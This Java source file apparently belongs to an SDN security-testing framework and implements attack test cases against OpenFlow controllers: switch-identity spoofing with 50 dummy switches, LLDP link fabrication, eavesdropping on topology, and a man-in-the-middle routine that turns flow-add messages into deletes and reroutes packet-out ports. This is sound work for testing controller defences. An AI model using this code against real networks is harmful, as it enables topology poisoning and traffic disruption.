package org.deltaproject.channelagent.testcase;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.PooledByteBufAllocator;
import io.netty.buffer.Unpooled;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import org.deltaproject.channelagent.core.Interface;
import org.deltaproject.channelagent.utils.Utils;
import org.deltaproject.channelagent.dummy.DummySwitch;
import org.deltaproject.channelagent.networknode.NetworkNode;
import org.deltaproject.channelagent.networknode.TopoInfo;
import org.projectfloodlight.openflow.exceptions.OFParseError;
import org.projectfloodlight.openflow.protocol.*;
import org.projectfloodlight.openflow.protocol.action.OFAction;
import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
import org.projectfloodlight.openflow.protocol.match.Match;
import org.projectfloodlight.openflow.protocol.match.MatchField;
import org.projectfloodlight.openflow.types.OFPort;
import org.projectfloodlight.openflow.types.U16;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class TestAdvancedCase {
    private static final Logger log = LoggerFactory.getLogger(TestAdvancedCase.class);

    static final int MINIMUM_LENGTH = 8;

    private OFFactory factory;
    private OFMessageReader<OFMessage> reader;
    private byte ofversion;

    private ArrayList<DummySwitch> switches;

    public TestAdvancedCase(OFFactory f, byte of) {
        this.factory = f;
        this.reader = factory.getReader();
        this.ofversion = of;
    }

    public ByteBuf getByteBuf(Packet p_temp) {
        // for OpenFlow Message
        byte[] rawMsg = new byte[p_temp.data.length];
        System.arraycopy(p_temp.data, 0, rawMsg, 0, p_temp.data.length);
        // ByteBuf byteMsg = Unpooled.copiedBuffer(rawMsg);

        return Unpooled.wrappedBuffer(rawMsg);
    }

    public boolean testSwitchIdentificationSpoofing(String controllerIP, String ofPort, byte OFVersion) {
        switches = new ArrayList<DummySwitch>();

        for (int i = 0; i < 50; i++) {

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            log.info("[Channel-Agent] Switch Spoofing " + i);
            DummySwitch dummysw = new DummySwitch();
            dummysw.connectTargetController(controllerIP, ofPort);
            dummysw.setOFFactory(OFVersion);
            dummysw.start();

            switches.add(dummysw);
        }

        return true;
    }

    public ByteBuf testLinkFabrication(Packet p_temp) throws OFParseError {
        ByteBuf bb = getByteBuf(p_temp);
        ByteBuf buf = null;

        int totalLen = bb.readableBytes();
        int offset = bb.readerIndex();

        EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;
        String src_mac = Utils.decalculate_mac(p_eth.src_mac);
        String dst_mac = Utils.decalculate_mac(p_eth.dst_mac);

        String src_ip = "";
        String dst_ip = "";

        int src_port = 0;
        int dst_port = 0;

        IPPacket p = ((IPPacket) p_temp);

        if (p instanceof TCPPacket) {
            TCPPacket tcp = ((TCPPacket) p);

            src_ip = p.src_ip.toString().split("/")[1];
            dst_ip = p.dst_ip.toString().split("/")[1];

            src_port = tcp.src_port;
            dst_port = tcp.dst_port;
        }

        while (offset < totalLen) {
            bb.readerIndex(offset);
            byte version = bb.readByte();
            bb.readByte();
            int length = U16.f(bb.readShort());
            bb.readerIndex(offset);

            if (version != this.ofversion) {
                // segmented TCP pkt
                // log.info("OFVersion Missing " + offset + ":" + totalLen);
                return null;
            }

            if (length < MINIMUM_LENGTH)
                throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

            try {
                OFMessage message = reader.readFrom(bb);

                if (message == null)
                    return null;

                if (message.getType() == OFType.PACKET_IN) {
                    OFPacketIn fi = (OFPacketIn) message;
                    byte[] data = fi.getData();

                    // LLDP 0x88cc
                    if ((data)[12] == -120 && (data)[13] == -52) {
                        String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));

                        byte[] temp = Arrays.copyOfRange(data, 26, 28);
                        int port = (int) Utils.byteToInt(temp, 2);

                        int inport = Integer.parseInt(fi.getInPort().toString());

                        OFPacketIn.Builder b = factory.buildPacketIn();

                        b.setXid(fi.getXid());
                        b.setBufferId(fi.getBufferId());
                        b.setReason(fi.getReason());
                        b.setTotalLen(fi.getTotalLen());
                        b.setInPort(fi.getInPort());

						/* for 1.3 later */
                        // b.setMatch(fi.getMatch());
                        // b.setCookie(fi.getCookie());
                        // b.setTableId(fi.getTableId());
                        // b.setInPhyPort(fi.getInPhyPort());

                        if (dpid.equals("00:00:00:00:00:02") && port == 1) {
                            data[22] = 3; // dpid
                            data[27] = 2; // port
                            data[27 + 18] = 3;
                        } else if (dpid.equals("00:00:00:00:00:02") && port == 2) {
                            data[22] = 1;
                            data[27] = 2;
                            data[27 + 18] = 1;
                        } else if (dpid.equals("00:00:00:00:00:01") && port == 2) {
                            data[22] = 0;
                            data[27] = 0;
                        } else if (dpid.equals("00:00:00:00:00:03") && port == 2) {
                            data[22] = 0;
                            data[27] = 0;
                        }

                        byte[] newdata = Arrays.copyOfRange(data, 0, data.length);
                        b.setData(newdata);
                        OFPacketIn newfm = b.build();
                        if (buf == null) {
                            buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);
                            newfm.writeTo(buf);
                        }
                    }
                }
            } catch (OFParseError e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            offset += length;
        }

        bb.clear();
        return buf;
    }

    public boolean testEvaseDrop(TopoInfo nodes, Packet p_temp) throws OFParseError {
        ByteBuf bb = getByteBuf(p_temp);

        int totalLen = bb.readableBytes();
        int offset = bb.readerIndex();

        EthernetPacket p_eth = (EthernetPacket) p_temp.datalink;
        String src_mac = Utils.decalculate_mac(p_eth.src_mac);
        String dst_mac = Utils.decalculate_mac(p_eth.dst_mac);

        String src_ip = "";
        String dst_ip = "";

        int src_port = 0;
        int dst_port = 0;

        IPPacket p = ((IPPacket) p_temp);

        if (p instanceof TCPPacket) {
            TCPPacket tcp = ((TCPPacket) p);

            src_ip = p.src_ip.toString().split("/")[1];
            dst_ip = p.dst_ip.toString().split("/")[1];

            src_port = tcp.src_port;
            dst_port = tcp.dst_port;
        }

        while (offset < totalLen) {
            bb.readerIndex(offset);
            byte version = bb.readByte();
            bb.readByte();
            int length = U16.f(bb.readShort());
            bb.readerIndex(offset);

            if (version != this.ofversion) {
                // segmented TCP pkt
                // log.info("OFVersion Missing " + offset + ":" + totalLen);
                return false;
            }

            if (length < MINIMUM_LENGTH)
                throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

            try {
                OFMessage message = reader.readFrom(bb);

                if (message == null)
                    return false;

                if (message.getType() == OFType.PACKET_OUT) {
                    OFPacketOut fo = (OFPacketOut) message;
                    byte[] data = fo.getData();

                    if ((data)[12] == -120 && (data)[13] == -52) {
                        /*
                         * log.info("[Channel-Agent] Get PACKET_OUT");
						 * log.info("[Channel-Agent] Length: " +
						 * data.length);
						 * log.info(Utils.byteArrayToHexString(data));
						 */

                        String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));
                        OFActionOutput out = (OFActionOutput) (fo.getActions().get(0));
                        String portnum = out.getPort().toString();

                        NetworkNode tempnode = new NetworkNode();
                        tempnode.setNodeType(NetworkNode.SWITCH);
                        tempnode.setIPAddr(dst_ip);
                        tempnode.setPort(dst_port);
                        tempnode.setDPID(dpid);

                        nodes.insertSwitch(tempnode);
                    }
                } else if (message.getType() == OFType.PACKET_IN) {
                    OFPacketIn fi = (OFPacketIn) message;
                    byte[] data = fi.getData();

                    // if type code is 0x0800 (IP) -> HOST
                    if ((data)[12] == 0x08 && (data)[13] == 0x00) {
                        // log.info("[Channel-Agent] Get PACKET_IN : "
                        // + fi.getInPort().toString());
                        // log.info("[Channel-Agent] Length: " +
                        // data.length);
                        // log.info(Utils.byteArrayToHexString(data));

                        int inport = 0;
                        if (version == 1)
                            inport = fi.getInPort().getPortNumber();
                        else if (version == 4) {
                            Match match = fi.getMatch();
                            inport = Integer.parseInt(match.get(MatchField.IN_PORT).toString());
                        }

                        String macaddr = Utils.decalculate_mac(Arrays.copyOfRange(data, 6, 12));
                        String ipaddr = Utils.byteArrayToIPString(Arrays.copyOfRange(data, 26, 30));

                        if (!ipaddr.equals("0.0.0.0")) {
                            NetworkNode tempnode = new NetworkNode();
                            tempnode.setNodeType(NetworkNode.HOST);
                            tempnode.setMacAddr(macaddr);
                            tempnode.setIPAddr(ipaddr);

                            nodes.insertNode(tempnode, inport, src_ip, src_port);
                        }
                    } else if ((data)[12] == -120 && (data)[13] == -52) {
                        String dpid = Utils.decalculate_mac(Arrays.copyOfRange(data, 17, 23));

                        byte[] temp = Arrays.copyOfRange(data, 26, 28);
                        int port = (int) Utils.byteToInt(temp, 2);

                        int inport = 0;
                        if (version == 1)
                            inport = fi.getInPort().getPortNumber();
                        else if (version == 4) {
                            Match match = fi.getMatch();
                            inport = Integer.parseInt(match.get(MatchField.IN_PORT).toString());
                        }

                        NetworkNode tempnode = new NetworkNode();
                        tempnode.setNodeType(NetworkNode.LINK);
                        tempnode.setPort(port);
                        tempnode.setDPID(dpid);

                        nodes.insertNode(tempnode, inport, src_ip, src_port);
                    }
                }
            } catch (OFParseError e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            offset += length;
        }

        bb.clear();
        return true;
    }

    public ByteBuf testMITM(Packet p_temp) throws OFParseError {
        ByteBuf bb = getByteBuf(p_temp);
        int totalLen = bb.readableBytes();
        int offset = bb.readerIndex();

        OFFlowMod newfm = null;
        OFPacketOut newoutput = null;

        ByteBuf buf = null;

        while (offset < totalLen) {
            bb.readerIndex(offset);

            byte version = bb.readByte();
            bb.readByte();
            int length = U16.f(bb.readShort());
            bb.readerIndex(offset);

            if (version != this.ofversion) {
                // segmented TCP pkt
                 log.info("[Channel Agent] OFVersion Missing " + version + " : " + offset + "-" + totalLen);
                return null;
            }

            if (length < MINIMUM_LENGTH)
                throw new OFParseError("Wrong length: Expected to be >= " + MINIMUM_LENGTH + ", was: " + length);

            try {
                OFMessage message = reader.readFrom(bb);

                if (message == null)
                    return null;

                if (message.getType() == OFType.FLOW_MOD) {
                    OFFlowMod fa = (OFFlowMod) message;

                    if (fa.getCommand() == OFFlowModCommand.ADD) {
                        OFFlowMod.Builder b = factory.buildFlowDelete();

                        b.setXid(fa.getXid());
                        b.setMatch(fa.getMatch());
                        b.setCookie(fa.getCookie());
                        b.setIdleTimeout(fa.getIdleTimeout());
                        b.setHardTimeout(fa.getHardTimeout());
                        b.setPriority(fa.getPriority());
                        b.setBufferId(fa.getBufferId());
                        b.setOutPort(fa.getOutPort());
                        b.setFlags(fa.getFlags());
                        b.setActions(fa.getActions());

                        newfm = b.build();

                        if (buf == null)
                            buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);

                        log.info("[Channel Agent] before FlowMod(ADD) " + fa.toString()
                                + " --> after FlowMod(Delete) " + newfm.toString());

                        newfm.writeTo(buf);
                    }

                } else if (message.getType() == OFType.PACKET_OUT) {
                    OFPacketOut pktout = (OFPacketOut) message;

                    if (pktout.getInPort() == OFPort.ANY) {
                        return null;
                    }

                    OFPacketOut.Builder b = factory.buildPacketOut();
                    b.setInPort(pktout.getInPort());
                    b.setXid(pktout.getXid());
                    b.setBufferId(pktout.getBufferId());
                    b.setData(pktout.getData());

                    List<OFAction> beforeActions = pktout.getActions();
                    List<OFAction> afterActions = new ArrayList<OFAction>();

                    int outNum = -1;
                    for (OFAction action : beforeActions) {
                        OFActionOutput actionOutput = (OFActionOutput) action;
                        OFPort outPort = actionOutput.getPort();

                        if (outPort == OFPort.FLOOD) {
                            return null;
                        } else if (outPort == OFPort.LOCAL) {
                            OFActionOutput.Builder aob = factory.actions().buildOutput();
                            aob.setPort(OFPort.LOCAL);
                            aob.setMaxLen(Integer.MAX_VALUE);
                            afterActions.add(aob.build());
                        } else {
                            OFActionOutput.Builder aob = factory.actions().buildOutput();
                            outNum = outPort.getPortNumber();
                            aob.setPort(OFPort.of(outPort.getPortNumber() + 1));
                            aob.setMaxLen(Integer.MAX_VALUE);
                            afterActions.add(aob.build());
                        }
                    }

                    b.setActions(afterActions);
                    newoutput = b.build();

                    if (buf == null)
                        buf = PooledByteBufAllocator.DEFAULT.directBuffer(totalLen);

                    log.info("[Channel Agent] before PacketOut Port " + outNum
                            + " --> after PacketOut " + (outNum + 1));

                    newoutput.writeTo(buf);
                }
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            offset += length;
        }

        bb.clear();
        return buf;
    }
}
